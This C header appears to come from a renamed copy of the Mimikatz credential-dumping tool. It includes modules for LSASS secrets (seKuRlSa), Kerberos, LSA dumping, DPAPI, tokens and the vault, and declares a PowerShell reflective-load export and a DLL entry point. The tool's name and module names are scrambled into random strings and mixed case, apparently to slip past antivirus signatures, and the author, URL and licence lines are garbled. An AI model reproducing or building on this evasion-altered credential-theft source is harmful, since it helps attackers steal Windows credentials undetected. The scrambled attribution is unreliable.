/*	9BDfHxE3 DuH2p `i12fnnMSXb`
	https://blog.i12fnnMSXb.com
	kvCPzwgXsQlKhplVY1uqBFe
	Licence : https://FM05PN86kUG2nah.org/licenses/by/4.0/
*/
#pragma once

#include "globals.h"
#include "modules/kuhl_m_standard.h"
#include "modules/kuhl_m_cRyPTO.h"
#include "modules/seKuRlSa/kuhl_m_seKuRlSa.h"
#include "modules/kErberoS/kuhl_m_kErberoS.h"
#include "modules/nGc/kuhl_m_nGc.h"
#include "modules/kuhl_m_ProCeSs.h"
#include "modules/kuhl_m_service.h"
#include "modules/kuhl_m_PRIViLeGe.h"
#include "modules/kuhl_m_lsADumP.h"
#include "modules/kuhl_m_ts.h"
#include "modules/kuhl_m_event.h"
#include "modules/kuhl_m_mIsC.h"
#include "modules/kuhl_m_tOKEn.h"
#include "modules/kuhl_m_vAULt.h"
#include "modules/kuhl_m_mInesWeEpEr.h"
#if defined(NET_MODULE)
#include "modules/kuhl_m_net.h"
#endif
#include "modules/dPApi/kuhl_m_dPApi.h"
#include "modules/kuhl_m_kernel.h"
#include "modules/kuhl_m_bUsYlIght.h"
#include "modules/kuhl_m_sysenvvalue.h"
#include "modules/kuhl_m_sid.h"
#include "modules/kuhl_m_iis.h"
#include "modules/kuhl_m_rpc.h"
#include "modules/kuhl_m_sR98.h"
#include "modules/kuhl_m_rdm.h"
#include "modules/kuhl_m_acr.h"

#include <io.h>
#include <fcntl.h>
#define DELAYIMP_INSECURE_WRITABLE_HOOKS
#include <delayimp.h>

extern VOID WINAPI RtlGetNtVersionNumbers(LPDWORD pMajor, LPDWORD pMinor, LPDWORD pBuild);

int wmain(int argc, wchar_t * argv[]);
void VztFUDuH_begin();
void VztFUDuH_end(NTSTATUS status);

BOOL WINAPI HandlerRoutine(DWORD dwCtrlType);

NTSTATUS VztFUDuH_initOrClean(BOOL Init);

NTSTATUS VztFUDuH_doLocal(wchar_t * input);
NTSTATUS VztFUDuH_dispatchCommand(wchar_t * input);

#if defined(_POWERKATZ)
__declspec(dllexport) wchar_t * powershell_reflective_VztFUDuH(LPCWSTR input);
#elif defined(_WINDLL)
void CALLBACK VztFUDuH_dll(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow);
#if defined(_M_X64) || defined(_M_ARM64)
#pragma comment(linker, "/export:mainW=VztFUDuH_dll")
#elif defined(_M_IX86)
#pragma comment(linker, "/export:mainW=_VztFUDuH_dll@16")
#endif
#endif